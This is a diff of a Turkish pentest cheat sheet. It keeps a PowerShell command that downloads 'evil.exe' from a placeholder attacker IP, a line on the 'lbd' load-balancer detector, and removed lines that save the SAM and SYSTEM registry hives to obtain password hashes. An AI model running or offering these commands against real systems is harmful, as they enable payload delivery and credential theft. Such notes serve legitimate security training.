@@ -183,10 +183,7 @@ powershell
 2.	İlgili dosya apache dizininde olacak
 “powershell.exe (New-Object System.Net.WebClient).Download.File(‘http://ip_adresi/evil.exe’,’C:\Users\Default\evil.exe’)”
 
-Bilgisayar Açıkken SAM ve SYSTEM Dosyalarını Elde Etmek
 
-reg save hklm\SAM sam
-reg save hklm\SYSTEM system
 
 Load Balance Detector
 Kali üzerinde “lbd” aracı ile hedefte yük dengeleyici olup olmadığını tespit ederiz. Özellikle Ddos saldırılarındaki yükü dengelemek için kullanılan bir güvenlik sistemidir.
